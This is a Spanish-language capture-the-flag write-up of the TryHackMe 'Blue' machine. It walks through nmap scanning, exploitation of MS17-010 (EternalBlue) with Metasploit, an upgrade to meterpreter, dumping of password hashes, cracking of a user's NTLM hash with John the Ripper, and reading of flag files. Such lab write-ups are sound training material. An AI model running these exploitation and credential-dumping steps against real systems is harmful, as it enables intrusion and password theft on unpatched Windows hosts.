---
title: Blue - TryHackMe
published: true
---

En esta ocasión vamos a resolver la máquina _Blue_ de _TryHackMe_. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla. Ya por el nombre de la máquina, podemos darnos una idea de por donde van los tiros, ¿quizá `EternalBlue`?

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/1.png)

### [](#header-3)Fase De Reconocimiento

Primeramente, vamos a utilizar la herramienta _Nmap_ para determinar que puertos están abiertos así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:

```bash
nmap -p- --open -T5 -v -n <dirección IP>
```
 
Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:
  
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <dirección IP>
```

A continuación se explican los parámetros utilizados en el escaneo de puertos con _Nmap_:
  
* p - Escanea todo el rango de puertos (65535 en total)
* open - Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)
* T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, "generaremos más ruido  ", pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos `White Hat`
* v - _Verbose_, reporta lo encontrado por consola
* n - No aplicar _resolución DNS_
* sS - Escaneo _TCP SYN_
* min-rate - Emitir paquetes no más lentos que \<valor\> por segundo
* vvv - Triple _verbose_, para obtener mayor información por consola
* Pn - No aplicar _host discovery_
  
Para determinar la versión y servicios que corren bajo estos puertos podemos realizar lo siguiente:

```bash
nmap -sC -sV -p 135,139,445,3389,49152,49153,49154,49158,49160 <dirección IP>
```
  
A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con _Nmap_:

* sC - Scripts básicos de enumeración
* sV - Versión y servicios que corren bajo los puertos encontrados
* p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)

Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra:

* ¿Cuántos puertos están abiertos con un número de puerto inferior a 1000?
* ¿A qué es vulnerable esta máquina?

Estas preguntas son bastante fáciles de responder si realizamos un buen escaneo con _Nmap_. Para responder a la primera pregunta no hay donde perderse, bastará con introducir cuántos puertos abiertos, inferiores a 1000, hemos detectado con nuestro escaneo; recordemos que existen en total 65535 puertos posibles. Para responder a la segunda pregunta, tendremos que realizar un escaneo adicional, ya que se nos pregunta, a que ataque es vulnerable la máquina; a modo de pista, la plataforma nos da un ejemplo de respuesta: _ms08-067_.

Si recordamos, lo más relevante que encontramos con nuestro escaneo de versiones y servicios con _Nmap_, es el puerto `445`, o servicio `Samba`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/2.png)

De modo que procederemos a utilizar los scripts específicos con los que cuenta _Nmap_, para detectar vulnerabilidades en un servicio `Samba`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/3.png)

Para poder utilizarlos podemos hacer lo siguiente:

```bash
nmap --script="smb-vuln*" -p 445 <dirección IP>
```

A continuación se explican los parámetros utilizados en el escaneo de vulnerabilidades del servicio `Samba` con _Nmap_:
  
  * script - Proporcionamos el script que queremos emplear; en este caso, como no teníamos un script en particular a utilizar, a través de expresiones regulares, indicamos que queremos utilizar todos aquellos scripts que comiencen por _smb-vuln_
  * p - Especificamos a que puertos queremos aplicar este escaneo

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/4.png)

Como podemos darnos cuenta, esta máquina es vulnerable a `MS17-010`, o también conocido como `EternalBlue`.

### [](#header-3)Fase De Explotación

Para esta segunda fase, _TryHackMe_ realiza la fase de explotación con el uso de `Metasploit`, no obstante, no recomiendo acostumbrarse a utilizar herramientas automatizadas, ya que perdemos bastante el control sobre lo que está pasando por detrás, de modo que no aprendemos; sin embargo, en esta máquina en concreto, no es posible realizar un procedimiento manual, ya que la máquina `Blue`, está pensada para ser explotada mediante el uso de _Metasploit_.

Para hacer uso de _Metasploit_ tendremos que abrir la aplicación, para ello haremos lo siguiente:

```  
msfconsole
```

Una vez hemos abierto _Metasploit_, procederemos a buscar aquello que queremos explotar, en este caso, `MS17-010`, o `EternalBlue`, cualquiera de las dos formas es válida.

```    
search eternalblue
search ms17-010
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/5.png)

Posteriormente elegiremos el _exploit_ a utilizar; de hecho, una de las preguntas de la plataforma justamente es, introducir el _exploit_ que vamos a utilizar.

```      
use exploit/windows/smb/ms17_010_eternalblue
```  

Una vez hemos seleccionado el _exploit_, procederemos a configurar tanto el `LHOST` como el `RHOST`, que, dicho de otra forma, procederemos a introducir nuestra _IP_, y la _IP_ de la máquina víctima.

```      
show options
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/6.png)

```      
set LHOST <nuestra IP> 
set RHOST <IP víctima>
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/7.png)

Una vez hemos configurado dichos parámetros, bastará con empezar con el ataque, consiguiéndonos _Metasploit_ una shell dentro de la máquina víctima.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/8.png)

Una vez llegados a este punto, _TryHackMe_ nos pide convertir nuestra shell actual, en `meterpreter`, para ello tendremos que abandonar nuestra sesión actual `Ctrl + Z`.

Una vez fuera, tendremos que nuevamente buscar dentro de _Metasploit_, un módulo que nos permita pasar de una shell a `meterpreter`.

```      
search shell_to_meterpreter
```

Una vez hemos encontrado un módulo que nos sirva, tendremos que utilizarlo.

```      
use post/multi/manage/shell_to_meterpreter
```

Y al igual que antes, tendremos que configurar cierto parámetro para poder conseguir un `meterpreter`, en este caso, la sesión con la que estábamos trabajando antes.

```      
show options
```
  
![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/9.png)

```        
sessions
set SESSION 1
run
```

La opción `sessions` nos permite listar todas las sesiones que tengamos activas; esto es útil si tenemos más de una sesión activa, y necesitamos indicar una en particular.


![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/10.png)

Una vez hemos conseguido un `meterpreter`, podemos volver a nuestra sesión.

```
sessions 1
```

### [](#header-3)Escalada De Privilegios

_TryHackMe_ nos indica que a través del comando `migrate <ID del proceso>`, podemos convertirnos en el usuario que está corriendo dicho proceso, sin embargo, esto no tiene ningún sentido ya que somos de hecho un usuario con máximos privilegios, somos `NT AUTHORITY\SYSTEM`, de modo que no tiene sentido migrar al usuario que ya somos.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/11.png)

Antes de pasar a conseguir las flags de la máquina, la plataforma nos sigue enseñando comandos útiles de _Metasploit_, en este caso el comando `hashdump`, con el cual podemos listar todos los usuarios del sistema, así como sus contraseñas _hasheadas_. 

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/12.png)

En esta fase se nos pregunta por el nombre del usuario no predeterminado, es decir, aquel usuario que no sea _Guest_, o _Administrator_; finalmente, se nos pide _crackear_ la contraseña de este usuario, para ello utilizaremos la herramienta `John the Ripper`, en conjunto del diccionario [rockyou.txt](https://objects.githubusercontent.com/github-production-release-asset-2e65be/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220209%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220209T031834Z&X-Amz-Expires=300&X-Amz-Signature=d8b079596701be0a466831ad31ee5cc654d2cc6b43291d532f275e51b6e480fb&X-Amz-SignedHeaders=host&actor_id=79855501&key_id=0&repo_id=97553311&response-content-disposition=attachment%3B%20filename%3Drockyou.txt&response-content-type=application%2Foctet-stream).

En caso de no contar con la herramienta `John the Ripper` instalada, podemos hacer lo siguiente:

```
sudo apt install john
```

En nuestra máquina, crearemos un documento de texto que contenga la contraseña _hasheada_ del usuario, podemos hacerlo de manera manual, o desde la misma terminal:

```bash
echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" >> nombreArchivo
```

Una vez creado el archivo de texto, podemos pasar a _crackear_ la contraseña:

```
sudo john --format=NT --wordlist=/dirección/del/diccionario/rockyou.txt nombreArchivo
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/13.png)


Una vez hemos _crackeado_ la contraseña que se nos solicitaba, podemos ahora si, pasar a buscar las respectivas flags. En este caso existe un total de 3 flags, las cuales, según indica la plataforma, están escondidas en ubicaciones claves de un sistema _Windows_, por lo que es aconsejable aprender estas locaciones. 

La primera flag dice que se encuentra en la raíz del sistema, dicho de otra forma, `Disco Local C`.

Para poder navegar dentro de la máquina víctima, podríamos usar el mismo `meterpreter`, sin embargo, en este caso nos manejaremos a través de una shell, para ello ejecutaremos el comando `shell`. Una vez hecho esto, podemos ir hacia el directorio `C:\\`, listar su contenido y encontrar la flag.

```
cd C:\\
dir
type flag1.txt
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/14.png)


La segunda flag dice que se encuentra en una ubicación donde se almacenan las contraseñas dentro de Windows, dicho de otra forma, `C:\Windows\System32\Config`.

```
cd C:\Windows\System32\Config
dir
type flag2.txt
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/15.png)

La última flag dice que se encuentra en una ubicación donde los administradores suelen tener guardadas cosas "bastante interesantes", personalmente no tengo idea de donde podría ser esta ubicación así que procederemos a buscar el archivo `flag3.txt`, dentro de todo el sistema, para ello tendremos que ir a la raíz del sistema, y empezar a buscar desde ahí:

```  
cd \
dir flag3.txt /s /p 
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/16.png)

Dudo mucho que los administradores guarden archivos importantes en una ubicación así, no obstante, es la plataforma la que nos comenta esto, y además, es aquí donde se encuentra la tercera y última flag, de modo que nos dirigiremos a esa ubicación para leer la flag.

```  
cd C:\Users\Jon\Documents
dir  
type flag3.txt  
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/17.png)
